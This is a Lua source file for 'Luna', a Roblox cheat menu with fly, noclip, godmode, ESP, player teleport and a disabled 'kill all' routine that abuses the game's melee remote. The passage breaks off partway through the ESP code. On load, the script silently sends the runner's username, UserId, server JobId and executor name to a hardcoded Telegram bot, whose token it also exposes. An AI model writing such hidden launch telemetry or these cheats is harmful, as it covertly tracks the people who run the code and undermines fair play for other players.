--[[ LUNA - ROBLOX CHEAT | v1.0.0
     Vector icons, custom notifications, working features. ]]--

local Players      = game:GetService("Players")
local UIS          = game:GetService("UserInputService")
local Tween        = game:GetService("TweenService")
local RunService   = game:GetService("RunService")
local Lighting     = game:GetService("Lighting")
local HttpService  = game:GetService("HttpService")
local Stats        = game:GetService("Stats")

local LP        = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")
local function Cam() return workspace.CurrentCamera end

----------------------------------------------------------------------
-- THEME
----------------------------------------------------------------------
local C = {
    bg      = Color3.fromRGB(13, 11, 24),
    side    = Color3.fromRGB(17, 14, 30),
    card    = Color3.fromRGB(22, 18, 38),
    elem    = Color3.fromRGB(30, 25, 48),
    elemH   = Color3.fromRGB(40, 33, 64),
    track   = Color3.fromRGB(45, 38, 66),
    border  = Color3.fromRGB(48, 40, 74),
    acc     = Color3.fromRGB(138, 99, 247),
    accDim  = Color3.fromRGB(96, 70, 180),
    text    = Color3.fromRGB(232, 228, 245),
    sub     = Color3.fromRGB(150, 142, 175),
    dim     = Color3.fromRGB(110, 104, 135),
    green   = Color3.fromRGB(86, 214, 142),
    red     = Color3.fromRGB(232, 78, 95),
    orange  = Color3.fromRGB(245, 175, 80),
    cyan    = Color3.fromRGB(96, 198, 232),
}
local FONT  = Enum.Font.GothamMedium
local FONTB = Enum.Font.GothamBold

local LUNA_VERSION = "v1.0.0"
local TELEGRAM_BOT_TOKEN = "8766606426:AAGshOyIPoNu-W9LaDBjprr_yfNjaVQgGA0"
local TELEGRAM_CHAT_ID = "8452122347"

----------------------------------------------------------------------
-- HELPERS
----------------------------------------------------------------------
local function new(class, props, children)
    local o = Instance.new(class)
    for k, v in pairs(props or {}) do if k ~= "Parent" then o[k] = v end end
    for _, c in ipairs(children or {}) do c.Parent = o end
    if props and props.Parent then o.Parent = props.Parent end
    return o
end
local function corner(p, r) return new("UICorner", { CornerRadius = UDim.new(0, r or 8), Parent = p }) end
local function stroke(p, col, th, tr)
    return new("UIStroke", { Color = col or C.acc, Thickness = th or 1, Transparency = tr or 0.5,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = p })
end
local function pad(p, l, t, r, b)
    return new("UIPadding", { PaddingLeft = UDim.new(0, l or 0), PaddingTop = UDim.new(0, t or 0),
        PaddingRight = UDim.new(0, r or l or 0), PaddingBottom = UDim.new(0, b or t or 0), Parent = p })
end
local function gradient(p, c1, c2, rot)
    return new("UIGradient", { Color = ColorSequence.new(c1, c2), Rotation = rot or 0, Parent = p })
end
local QUICK = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local function tw(o, i, props) return Tween:Create(o, i or QUICK, props) end

local MOUSE_NAMES = {
    [Enum.UserInputType.MouseButton1] = "ЛКМ",
    [Enum.UserInputType.MouseButton2] = "ПКМ",
    [Enum.UserInputType.MouseButton3] = "СКМ",
}
local function bindDisplay(b)
    if not b then return "—" end
    if MOUSE_NAMES[b] then return MOUSE_NAMES[b] end
    return b.Name
end
local function resolveBind(name)
    if typeof(name) == "EnumItem" then return name end
    if type(name) ~= "string" then return nil end
    local ok, kc = pcall(function() return Enum.KeyCode[name] end); if ok and kc then return kc end
    local ok2, it = pcall(function() return Enum.UserInputType[name] end); if ok2 and it then return it end
    return nil
end
local function bindMatches(b, input)
    if not b then return false end
    return b == input.KeyCode or b == input.UserInputType
end

-- Resolve executor functions wherever they live (getgenv / globals / fenv).
local ENV = (typeof(getgenv) == "function" and getgenv()) or _G or {}
local function resolveFn(name)
    if typeof(ENV[name]) == "function" then return ENV[name] end
    local ok1, g = pcall(function() return rawget(_G, name) end)
    if ok1 and typeof(g) == "function" then return g end
    local ok2, fe = pcall(function() return getfenv and getfenv(1) end)
    if ok2 and type(fe) == "table" and typeof(fe[name]) == "function" then return fe[name] end
    return nil
end
local function resolveRequest()
    local req = resolveFn("request") or resolveFn("http_request")
    if typeof(req) == "function" then return req end
    local okSyn, synReq = pcall(function() return syn and syn.request end)
    if okSyn and typeof(synReq) == "function" then return synReq end
    local okHttp, httpReq = pcall(function() return http and http.request end)
    if okHttp and typeof(httpReq) == "function" then return httpReq end
    return nil
end
local EX = {
    mouse1click       = resolveFn("mouse1click"),
    mouse1press       = resolveFn("mouse1press"),
    mouse1release     = resolveFn("mouse1release"),
    getconnections    = resolveFn("getconnections"),
    hookmetamethod    = resolveFn("hookmetamethod"),
    getnamecallmethod = resolveFn("getnamecallmethod"),
    getrawmetatable   = resolveFn("getrawmetatable"),
    setreadonly       = resolveFn("setreadonly") or resolveFn("make_writeable") or resolveFn("setrawmetatable"),
    newcclosure       = resolveFn("newcclosure") or function(f) return f end,
    request           = resolveRequest(),
}

local function getExecutorName()
    local ok, n = pcall(function() return identifyexecutor and identifyexecutor() end)
    if ok and n then return tostring(n) end
    ok, n = pcall(function() return getexecutorname and getexecutorname() end)
    if ok and n then return tostring(n) end
    return "Unknown"
end

local function tgEsc(v)
    return tostring(v)
        :gsub("&", "&amp;")
        :gsub("<", "&lt;")
        :gsub(">", "&gt;")
end

local function sendTelegramLaunch()
    if type(TELEGRAM_BOT_TOKEN) ~= "string" or TELEGRAM_BOT_TOKEN == "" then return end
    if type(TELEGRAM_CHAT_ID) ~= "string" or TELEGRAM_CHAT_ID == "" then return end
    if not EX.request then return end

    local placeUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
    local message = table.concat({
        "🌙 <b>Luna запущена</b>",
        "━━━━━━━━━━━━━━━━",
        "👤 <b>Игрок</b>",
        "• Ник: <code>" .. tgEsc(LP.Name) .. "</code>",
        "• Display: <code>" .. tgEsc(LP.DisplayName) .. "</code>",
        "• UserId: <code>" .. tgEsc(LP.UserId) .. "</code>",
        "",
        "🎮 <b>Сервер</b>",
        "• PlaceId: <code>" .. tgEsc(game.PlaceId) .. "</code>",
        "• JobId: <code>" .. tgEsc(game.JobId) .. "</code>",
        "• Игроков: <code>" .. tgEsc(#Players:GetPlayers()) .. "</code>",
        "• Игра: <a href=\"" .. placeUrl .. "\">открыть Roblox</a>",
        "",
        "⚙️ <b>Клиент</b>",
        "• Executor: <code>" .. tgEsc(getExecutorName()) .. "</code>",
        "• Версия: <code>" .. tgEsc(LUNA_VERSION) .. "</code>",
        "• Время: <code>" .. tgEsc(os.date("%Y-%m-%d %H:%M:%S")) .. "</code>",
    }, "\n")

    task.spawn(function()
        pcall(function()
            EX.request({
                Url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    chat_id = TELEGRAM_CHAT_ID,
                    text = message,
                    parse_mode = "HTML",
                    disable_web_page_preview = true,
                }),
            })
        end)
    end)
end
sendTelegramLaunch()

-- Wrap per-frame callbacks so a single bad frame can't flood the console.
local Luna_Unloaded = false
local unloadLuna  -- forward declaration; defined near the end
local _lastWarn = 0
local function guard(fn)
    return function(...)
        if Luna_Unloaded then return end
        local ok, err = pcall(fn, ...)
        if not ok and os.clock() - _lastWarn > 3 then
            _lastWarn = os.clock(); warn("[Luna] " .. tostring(err))
        end
    end
end

----------------------------------------------------------------------
-- VECTOR ICON LIBRARY  (24x24 viewBox, Feather-style line icons)
----------------------------------------------------------------------
local function iline(parent, x1, y1, x2, y2, th, col)
    local dx, dy = x2 - x1, y2 - y1
    local len = math.sqrt(dx * dx + dy * dy)
    local f = new("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromOffset((x1 + x2) / 2, (y1 + y2) / 2),
        Size = UDim2.fromOffset(len + th * 0.5, th),
        Rotation = math.deg(math.atan2(dy, dx)),
        BackgroundColor3 = col, BorderSizePixel = 0, Parent = parent,
    })
    corner(f, th / 2)
    return f
end
local function icircle(parent, cx, cy, d, th, col, filled)
    local f = new("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromOffset(cx, cy),
        Size = UDim2.fromOffset(d, d), BackgroundTransparency = filled and 0 or 1,
        BackgroundColor3 = col, BorderSizePixel = 0, Parent = parent,
    })
    corner(f, d / 2)
    if not filled then stroke(f, col, th, 0) end
    return f
end
local function irect(parent, x, y, w, h, th, col, cr, filled)
    local f = new("Frame", {
        Position = UDim2.fromOffset(x, y), Size = UDim2.fromOffset(w, h),
        BackgroundTransparency = filled and 0 or 1, BackgroundColor3 = col,
        BorderSizePixel = 0, Parent = parent,
    })
    corner(f, cr or 2)
    if not filled then stroke(f, col, th, 0) end
    return f
end

local ICONS = {}
-- Главная: дашборд (4 скруглённых квадрата)
ICONS.home = function(L, Ci, R) R(4,4,7,7,0,2.5,true); R(13,4,7,7,0,2.5,true); R(4,13,7,7,0,2.5,true); R(13,13,7,7,0,2.5,true) end
-- Визуалы: линза + зрачок
ICONS.eye  = function(L, Ci, R) R(2.5,7,19,10,2.2,5); Ci(12,12,3.2,0,true) end
-- Худ: монитор с подставкой
ICONS.bars = function(L, Ci, R) R(3,4,18,13,2.2,2.5); L(8.5,21,15.5,21,2.2); L(12,17,12,21,2.2) end
-- Игроки: двое
ICONS.users = function(L, Ci, R) Ci(9,8.5,7,2.2); R(3.5,15.5,11,7.5,2.2,5); Ci(17,7.5,5,2.2) end
-- Мир: глобус
ICONS.globe = function(L, Ci, R) Ci(12,12,18,2.2); L(3,12,21,12,2.2); R(7.5,3,9,18,2.2,4.5) end
-- Оружие: прицел/оптика
ICONS.crosshair = function(L, Ci, R) Ci(12,12,17,2.2); L(12,1.5,12,6,2.2); L(12,18,12,22.5,2.2); L(1.5,12,6,12,2.2); L(18,12,22.5,12,2.2); Ci(12,12,3.6,0,true) end
-- Скрипты: документ
ICONS.file = function(L, Ci, R) R(5,3,14,18,2.2,2.5); L(8.5,9,15.5,9,2); L(8.5,12.5,15.5,12.5,2); L(8.5,16,13,16,2) end
-- Конфиг: папка
ICONS.save = function(L, Ci, R) R(3,5.5,8,4,2.2,2); R(3,7.5,18,12.5,2.2,2.5) end
-- Настройки: шестерёнка
ICONS.gear = function(L, Ci, R)
    for i = 0, 7 do
        local a = math.rad(i * 45)
        L(12 + math.cos(a)*6.5, 12 + math.sin(a)*6.5, 12 + math.cos(a)*10.5, 12 + math.sin(a)*10.5, 2.8)
    end
    Ci(12,12,13,2.2); Ci(12,12,5,2.2)
end
ICONS.play = function(L, Ci, R) L(8,5,18,12); L(18,12,8,19); L(8,5,8,19) end
ICONS.edit = function(L, Ci, R) L(5,19,16,8,2.5); L(14,6,18,10,2.5); L(4,20,5,19,2.5); Ci(4.5,19.5,2,2,true) end
ICONS.trash = function(L, Ci, R) L(4,6,20,6,2); L(9,6,9,3); L(15,6,15,3); L(9,3,15,3); R(6,6,12,15,2,2); L(10,10,10,18); L(14,10,14,18) end
ICONS.x = function(L, Ci, R) L(6,6,18,18,2); L(18,6,6,18,2) end
ICONS.chevron = function(L, Ci, R) L(6,9,12,15,2); L(12,15,18,9,2) end
ICONS.plus = function(L, Ci, R) L(12,5,12,19,2); L(5,12,19,12,2) end
ICONS.check = function(L, Ci, R) L(5,13,10,18,2.5); L(10,18,19,6,2.5) end
ICONS.info = function(L, Ci, R) Ci(12,12,18,2); L(12,11,12,17); Ci(12,7,2,2,true) end
ICONS.warn = function(L, Ci, R) L(12,3,21,20); L(21,20,3,20); L(3,20,12,3); L(12,9,12,14); Ci(12,17,2,2,true) end
ICONS.list = function(L, Ci, R) L(9,6,20,6); L(9,12,20,12); L(9,18,20,18); Ci(4,6,2,2,true); Ci(4,12,2,2,true); Ci(4,18,2,2,true) end
ICONS.crescent = function(L, Ci, R, col) Ci(12,12,18,0,true) end

local function drawIcon(container, name, col, size)
    local s = size / 24
    local fn = ICONS[name]; if not fn then return end
    local function Lf(x1,y1,x2,y2,th) iline(container, x1*s, y1*s, x2*s, y2*s, (th or 2)*s, col) end
    local function Cf(cx,cy,d,th,filled) icircle(container, cx*s, cy*s, d*s, (th or 2)*s, col, filled) end
    local function Rf(x,y,w,h,th,cr,filled) irect(container, x*s, y*s, w*s, h*s, (th or 2)*s, col, (cr or 2)*s, filled) end
    fn(Lf, Cf, Rf, col)
end
local function Icon(parent, name, col, size)
    local box = new("Frame", { Size = UDim2.fromOffset(size, size), BackgroundTransparency = 1, Parent = parent })
    drawIcon(box, name, col, size)
    return box
end
local function recolorIcon(box, col)
    for _, d in ipairs(box:GetDescendants()) do
        if d:IsA("Frame") and d.BackgroundTransparency == 0 then d.BackgroundColor3 = col
        elseif d:IsA("UIStroke") then d.Color = col end
    end
end

----------------------------------------------------------------------
-- ROOT
----------------------------------------------------------------------
if PlayerGui:FindFirstChild("LunaUI") then PlayerGui.LunaUI:Destroy() end
if PlayerGui:FindFirstChild("LunaESP") then PlayerGui.LunaESP:Destroy() end
pcall(function() RunService:UnbindFromRenderStep("LunaAim") end)
pcall(function() RunService:UnbindFromRenderStep("LunaMouseFree") end)

local GUI = new("ScreenGui", { Name = "LunaUI", ResetOnSpawn = false, DisplayOrder = 50,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling, IgnoreGuiInset = true, Parent = PlayerGui })

local Backdrop = new("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = Color3.new(0, 0, 0),
    BackgroundTransparency = 1, BorderSizePixel = 0, Parent = GUI })

local W, H = 980, 600
local Win = new("Frame", { Size = UDim2.fromOffset(W, H), Position = UDim2.fromScale(0.5, 0.5),
    AnchorPoint = Vector2.new(0.5, 0.5), BackgroundColor3 = C.bg, BorderSizePixel = 0, Visible = false, Parent = GUI })
corner(Win, 14)
stroke(Win, Color3.fromRGB(60, 50, 95), 1, 0.4)
local WinScale = new("UIScale", { Scale = 1, Parent = Win })

----------------------------------------------------------------------
-- NOTIFICATIONS (custom, menu-styled)
----------------------------------------------------------------------
local NotifHolder = new("Frame", { Size = UDim2.new(0, 300, 1, -32), Position = UDim2.new(1, -16, 0, 16),
    AnchorPoint = Vector2.new(1, 0), BackgroundTransparency = 1, Parent = GUI })
new("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder,
    HorizontalAlignment = Enum.HorizontalAlignment.Right, VerticalAlignment = Enum.VerticalAlignment.Top, Parent = NotifHolder })
local notifCount = 0

local function Notify(title, msg, kind, dur)
    kind = kind or "info"; dur = dur or 4
    local accent = (kind == "success" and C.green) or (kind == "error" and C.red)
        or (kind == "warning" and C.orange) or C.acc
    local iconName = (kind == "success" and "check") or (kind == "error" and "x")
        or (kind == "warning" and "warn") or "info"
    notifCount = notifCount + 1
    local cg = new("CanvasGroup", { Size = UDim2.new(1, 0, 0, 60), BackgroundColor3 = C.card,
        BorderSizePixel = 0, GroupTransparency = 1, LayoutOrder = -notifCount, Parent = NotifHolder })
    corner(cg, 9); stroke(cg, accent, 1, 0.4)
    local sc = new("UIScale", { Scale = 0.9, Parent = cg })
    new("Frame", { Size = UDim2.new(0, 4, 1, -12), Position = UDim2.fromOffset(0, 6), BackgroundColor3 = accent,
        BorderSizePixel = 0, Parent = cg }, { (function() local u = Instance.new("UICorner"); u.CornerRadius = UDim.new(0, 2); return u end)() })
    local iconBox = new("Frame", { Size = UDim2.fromOffset(22, 22), Position = UDim2.fromOffset(14, 10),
        BackgroundTransparency = 1, Parent = cg })
    Icon(iconBox, iconName, accent, 22)
    new("TextLabel", { Size = UDim2.new(1, -54, 0, 18), Position = UDim2.fromOffset(46, 9), BackgroundTransparency = 1,
        Text = title, TextColor3 = C.text, TextSize = 14, Font = FONTB, TextXAlignment = Enum.TextXAlignment.Left, Parent = cg })
    new("TextLabel", { Size = UDim2.new(1, -56, 0, 28), Position = UDim2.fromOffset(46, 26), BackgroundTransparency = 1,
        Text = msg, TextColor3 = C.sub, TextSize = 12, Font = FONT, TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top, Parent = cg })
    local prog = new("Frame", { Size = UDim2.new(1, -12, 0, 2), Position = UDim2.new(0, 6, 1, -5), BackgroundColor3 = accent,
        BorderSizePixel = 0, Parent = cg })
    corner(prog, 1)
    tw(cg, TweenInfo.new(0.25), { GroupTransparency = 0 }):Play()
    tw(sc, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
    tw(prog, TweenInfo.new(dur, Enum.EasingStyle.Linear), { Size = UDim2.new(0, 0, 0, 2) }):Play()
    task.delay(dur, function()
        tw(cg, TweenInfo.new(0.25), { GroupTransparency = 1 }):Play()
        tw(sc, TweenInfo.new(0.25), { Scale = 0.9 }):Play()
        task.wait(0.28); cg:Destroy()
    end)
end

----------------------------------------------------------------------
-- FEATURE STATE & SETTERS (for config save/load)
----------------------------------------------------------------------
local State = {}
local Setters = {}

local function getChar() return LP.Character end
local function getHum() local c = LP.Character; return c and c:FindFirstChildOfClass("Humanoid") end
local function getRoot() local c = LP.Character; return c and c:FindFirstChild("HumanoidRootPart") end

----------------------------------------------------------------------
-- FEATURES: PLAYER
----------------------------------------------------------------------
State.walkspeed, State.jumppower = 16, 50

local function applyWalk() local h = getHum(); if h then h.WalkSpeed = State.walkspeed end end
local function applyJump() local h = getHum(); if h then h.UseJumpPower = true; h.JumpPower = State.jumppower end end

local noclipConn
local function setNoclip(on)
    State.noclip = on
    if on and not noclipConn then
        noclipConn = RunService.Stepped:Connect(function()
            local c = LP.Character
            if c then for _, v in ipairs(c:GetDescendants()) do
                if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end end end
        end)
    elseif not on and noclipConn then noclipConn:Disconnect(); noclipConn = nil end
end

local godConn
local function setGod(on)
    State.godmode = on
    if godConn then godConn:Disconnect(); godConn = nil end
    local h = getHum()
    if on and h then
        h.MaxHealth = math.huge; h.Health = math.huge
        godConn = h.HealthChanged:Connect(function() if State.godmode then h.Health = math.huge end end)
    elseif h then h.MaxHealth = 100; h.Health = 100 end
end

UIS.JumpRequest:Connect(function()
    if State.infjump then local h = getHum(); if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end end
end)

local lastSafe
RunService.Heartbeat:Connect(function()
    local r = getRoot(); if not r then return end
    if State.antivoid then
        if r.Position.Y > -50 then lastSafe = r.CFrame
        elseif r.Position.Y < -250 and lastSafe then r.CFrame = lastSafe + Vector3.new(0, 10, 0) end
    end
end)

-- FLY
local flyConn, flyBV, flyBG
local flyDir = { f = false, b = false, l = false, r = false, u = false, d = false }
local function setFly(on)
    State.fly = on
    local r = getRoot()
    if on and r then
        flyBV = new("BodyVelocity", { MaxForce = Vector3.new(1, 1, 1) * 9e9, Velocity = Vector3.zero, P = 9e4, Parent = r })
        flyBG = new("BodyGyro", { MaxTorque = Vector3.new(1, 1, 1) * 9e9, P = 9e4, CFrame = r.CFrame, Parent = r })
        flyConn = RunService.RenderStepped:Connect(function()
            local cam = Cam(); local rr = getRoot(); if not rr or not flyBV then return end
            local dir = Vector3.zero
            if flyDir.f then dir += cam.CFrame.LookVector end
            if flyDir.b then dir -= cam.CFrame.LookVector end
            if flyDir.l then dir -= cam.CFrame.RightVector end
            if flyDir.r then dir += cam.CFrame.RightVector end
            if flyDir.u then dir += Vector3.new(0, 1, 0) end
            if flyDir.d then dir += Vector3.new(0, -1, 0) end
            flyBV.Velocity = (dir.Magnitude > 0 and dir.Unit or Vector3.zero) * (State.flyspeed or 60)
            flyBG.CFrame = cam.CFrame
        end)
    else
        if flyConn then flyConn:Disconnect(); flyConn = nil end
        if flyBV then flyBV:Destroy(); flyBV = nil end
        if flyBG then flyBG:Destroy(); flyBG = nil end
    end
end
UIS.InputBegan:Connect(function(i, gp) if gp then return end
    local k = i.KeyCode
    if k == Enum.KeyCode.W then flyDir.f = true elseif k == Enum.KeyCode.S then flyDir.b = true
    elseif k == Enum.KeyCode.A then flyDir.l = true elseif k == Enum.KeyCode.D then flyDir.r = true
    elseif k == Enum.KeyCode.Space then flyDir.u = true elseif k == Enum.KeyCode.LeftControl then flyDir.d = true end
end)
UIS.InputEnded:Connect(function(i)
    local k = i.KeyCode
    if k == Enum.KeyCode.W then flyDir.f = false elseif k == Enum.KeyCode.S then flyDir.b = false
    elseif k == Enum.KeyCode.A then flyDir.l = false elseif k == Enum.KeyCode.D then flyDir.r = false
    elseif k == Enum.KeyCode.Space then flyDir.u = false elseif k == Enum.KeyCode.LeftControl then flyDir.d = false end
end)

LP.CharacterAdded:Connect(function()
    if Luna_Unloaded then return end
    task.wait(0.4)
    if Luna_Unloaded then return end
    if State.walkspeed ~= 16 then applyWalk() end
    if State.jumppower ~= 50 then applyJump() end
    if State.noclip then setNoclip(true) end
    if State.godmode then setGod(true) end
    if State.fly then setFly(true) end
end)

local function teleportTo(plr)
    local me = getRoot(); local tc = plr and plr.Character
    local tr = tc and tc:FindFirstChild("HumanoidRootPart")
    if me and tr then me.CFrame = tr.CFrame + Vector3.new(0, 0, 3); Notify("Телепорт", "К игроку " .. plr.Name, "success")
    else Notify("Телепорт", "Игрок недоступен", "error") end
end

----------------------------------------------------------------------
-- FEATURES: KILL ALL (hold bind -> teleport to each enemy & knife them)
----------------------------------------------------------------------
State.killall_realtp = true   -- real teleport to target (server registers the hit)
State.killall_return = true   -- return to start position when released
local killKeyBind = Enum.KeyCode.Z
local killHeld = false
local killing = false
local killallLocked = true   -- feature disabled (movement anticheat detects the TP)

-- auto-equip a knife/melee tool
local KNIFE_NAMES = { "knife", "karambit", "machete", "blade", "sword", "butterfly", "dagger", "axe", "katana", "scythe" }
local function isKnife(tool)
    local n = string.lower(tool.Name)
    for _, k in ipairs(KNIFE_NAMES) do if string.find(n, k, 1, true) then return true end end
    return false
end
local function equipKnife()
    local char = LP.Character; local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not char or not hum then return nil end
    local cur = char:FindFirstChildOfClass("Tool")
    if cur and isKnife(cur) then return cur end
    local bp = LP:FindFirstChild("Backpack")
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") and isKnife(t) then pcall(function() hum:EquipTool(t) end); return t end
        end
    end
    return cur
end

-- MeleeEvent:FireServer(v6) where v6 = a BasePart of the victim's character
local function victimPart(char)
    return char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
        or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
        or char:FindFirstChildWhichIsA("BasePart")
end
local function fireMelee(victim)
    local char = victim.Character; if not char then return end
    local cr = LP:FindFirstChild("ClientRemotes")
    local me = cr and cr:FindFirstChild("MeleeEvent")
    local part = victimPart(char)
    if me and me:IsA("RemoteEvent") and part then
        pcall(function() me:FireServer(part) end)
    end
end

-- main loop: while held, fly to each enemy, knife, then move on; restore at end
local function killLoop()
    if killing then return end
    killing = true
    local origin = getRoot() and getRoot().CFrame
    while killHeld do
        local root = getRoot()
        if root then
            equipKnife()
            for _, plr in ipairs(Players:GetPlayers()) do
                if not killHeld then break end
                local char = plr.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if plr ~= LP and hrp and hum and hum.Health > 0 then
                    if State.killall_realtp then
                        root.CFrame = hrp.CFrame * CFrame.new(0, 0, -2.5)
                        task.wait(0.07)          -- let our position replicate to server
                        root.CFrame = hrp.CFrame * CFrame.new(0, 0, -2.5)
                    end
                    fireMelee(plr)
                    task.wait(0.03)
                end
            end
        end
        task.wait(0.03)
    end
    if State.killall_return and origin and getRoot() then getRoot().CFrame = origin end
    killing = false
end

UIS.InputBegan:Connect(function(i)
    if not killallLocked and bindMatches(killKeyBind, i) then killHeld = true; task.spawn(killLoop) end
end)
UIS.InputEnded:Connect(function(i)
    if bindMatches(killKeyBind, i) then killHeld = false end
end)

----------------------------------------------------------------------
-- FEATURES: WORLD
----------------------------------------------------------------------
local lightSaved = { Brightness = Lighting.Brightness, FogEnd = Lighting.FogEnd, FogStart = Lighting.FogStart,
    ClockTime = Lighting.ClockTime, Ambient = Lighting.Ambient, OutdoorAmbient = Lighting.OutdoorAmbient }
local savedGravity = workspace.Gravity
local fullbright = false
local function setFullbright(on)
    State.fullbright = on
    if on then Lighting.Brightness = 2; Lighting.Ambient = Color3.new(1,1,1); Lighting.OutdoorAmbient = Color3.new(1,1,1); Lighting.FogEnd = 1e9
    else Lighting.Brightness = lightSaved.Brightness; Lighting.Ambient = lightSaved.Ambient
        Lighting.OutdoorAmbient = lightSaved.OutdoorAmbient; Lighting.FogEnd = lightSaved.FogEnd end
end
local function setNoFog(on) State.nofog = on; Lighting.FogEnd = on and 1e9 or lightSaved.FogEnd; Lighting.FogStart = on and 0 or lightSaved.FogStart end
local function setNoSky(on)
    State.nosky = on
    local sky = Lighting:FindFirstChildOfClass("Sky")
    if on and sky then sky:Destroy()
    elseif not on and not Lighting:FindFirstChildOfClass("Sky") then new("Sky", { Parent = Lighting }) end
end
local dayConn
local function setForeverDay(on)
    State.foreverday = on
    if dayConn then dayConn:Disconnect(); dayConn = nil end
    if on then dayConn = RunService.Heartbeat:Connect(function() Lighting.ClockTime = 14 end) end
end
local function setNightVision(on) State.night = on; Lighting.Ambient = on and Color3.fromRGB(120, 255, 160) or lightSaved.Ambient end

----------------------------------------------------------------------
-- FEATURES: HUD WATERMARK
----------------------------------------------------------------------
local WM = new("Frame", { Size = UDim2.fromOffset(250, 30), Position = UDim2.fromOffset(12, 12),
    BackgroundColor3 = C.card, BorderSizePixel = 0, Visible = false, Parent = GUI })
corner(WM, 8); stroke(WM, C.acc, 1, 0.4)
new("Frame", { Size = UDim2.new(0, 3, 1, -10), Position = UDim2.fromOffset(0, 5), BackgroundColor3 = C.acc,
    BorderSizePixel = 0, Parent = WM }, { (function() local u = Instance.new("UICorner"); u.CornerRadius = UDim.new(0, 2); return u end)() })
local WMText = new("TextLabel", { Size = UDim2.new(1, -16, 1, 0), Position = UDim2.fromOffset(12, 0),
    BackgroundTransparency = 1, Text = "LUNA", TextColor3 = C.text, TextSize = 12, Font = FONTB,
    TextXAlignment = Enum.TextXAlignment.Left, Parent = WM })

State.wm_fps, State.wm_ping, State.wm_time, State.wm_players = true, true, false, true
State.wm_pos = "Верх слева"
local function wmAnchor()
    local vp = GUI.AbsoluteSize
    local w, h, m = WM.AbsoluteSize.X, 30, 12
    local pos = State.wm_pos
    if pos == "Верх справа" then WM.Position = UDim2.fromOffset(vp.X - w - m, m)
    elseif pos == "Низ слева" then WM.Position = UDim2.fromOffset(m, vp.Y - h - m)
    elseif pos == "Низ справа" then WM.Position = UDim2.fromOffset(vp.X - w - m, vp.Y - h - m)
    else WM.Position = UDim2.fromOffset(m, m) end
end
local fpsCount, fps = 0, 60
RunService.RenderStepped:Connect(function() fpsCount += 1 end)
task.spawn(function() while true do task.wait(1); fps = fpsCount; fpsCount = 0 end end)
RunService.Heartbeat:Connect(guard(function()
    if not WM.Visible then return end
    local parts = { "LUNA" }
    if State.wm_fps then table.insert(parts, "FPS: " .. fps) end
    if State.wm_ping then
        local ping = 0
        pcall(function() ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) end)
        table.insert(parts, "Ping: " .. ping .. "ms")
    end
    if State.wm_players then table.insert(parts, "Игроков: " .. #Players:GetPlayers()) end
    if State.wm_time then table.insert(parts, os.date("%H:%M:%S")) end
    WMText.Text = table.concat(parts, "  |  ")
    WM.Size = UDim2.fromOffset(math.max(120, WMText.TextBounds.X + 28), 30)
    wmAnchor()
end))

----------------------------------------------------------------------
-- FEATURES: ESP
----------------------------------------------------------------------
local ESPGui = new("ScreenGui", { Name = "LunaESP", ResetOnSpawn = false, DisplayOrder = 40,
    IgnoreGuiInset = true, Parent = PlayerGui })
local espObjects = {}
local function createEsp(plr)
    if espObjects[plr] then return end
    local box = new("Frame", { BackgroundTransparency = 1, BorderSizePixel = 0, Visible = false, Parent = ESPGui })
    local bs = stroke(box, C.acc, 1.5, 0)
    local nameL = new("TextLabel", { Size = UDim2.fromOffset(140, 14), BackgroundTransparency = 1, Visible = false,
        TextColor3 = C.text, TextSize = 12, Font = FONTB, Parent = ESPGui })
    local distL = new("TextLabel", { Size = UDim2.fromOffset(140, 12), BackgroundTransparency = 1, Visible = false,
        TextColor3 = C.sub, TextSize = 11, Font = FONT, Parent = ESPGui })
    local hpbg = new("Frame", { Size = UDim2.fromOffset(3, 50), BackgroundColor3 = Color3.new(0,0,0),
        BackgroundTransparency = 0.4, BorderSizePixel = 0, Visible = false, Parent = ESPGui })
    local hpfill = new("Frame", { Size = UDim2.fromScale(1, 1), AnchorPoint = Vector2.new(0, 1),
        Position = UDim2.fromScale(0, 1), BackgroundColor3 = C.green, BorderSizePixel = 0, Parent = hpbg })
    local tracer = new("Frame", { AnchorPoint = Vector2.new(0.5, 0.5), Size = UDim2.fromOffset(1, 1),
        BackgroundColor3 = C.acc, BorderSizePixel = 0, Visible = false, Parent = ESPGui })
    espObjects[plr] = { box = box, bs = bs, name = nameL, dist = distL, hpbg = hpbg, hpfill = hpfill, tracer = tracer }
end
local function removeEsp(plr)
    local o = espObjects[plr]; if not o then return end
    for _, v in pairs(o) do if typeof(v) == "Instance" then v:Destroy() end end
    espObjects[plr] = nil
end
for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then createEsp(p) end end
Players.PlayerAdded:Connect(function(p) if not Luna_Unloaded and p ~= LP then createEsp(p) end end)
Players.PlayerRemoving:Connect(removeEsp)

RunService.RenderStepped:Connect(guard(function()
    local cam = Cam()
    for plr, o in pairs(espObjects) do
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local head = char and char:FindFirstChild("Head")
        local show = State.esp_master and hrp and hum and hum.Health > 0
        if show then
            local sp, onScreen = cam:WorldToViewportPoint(hrp.Position)
            if onScreen then
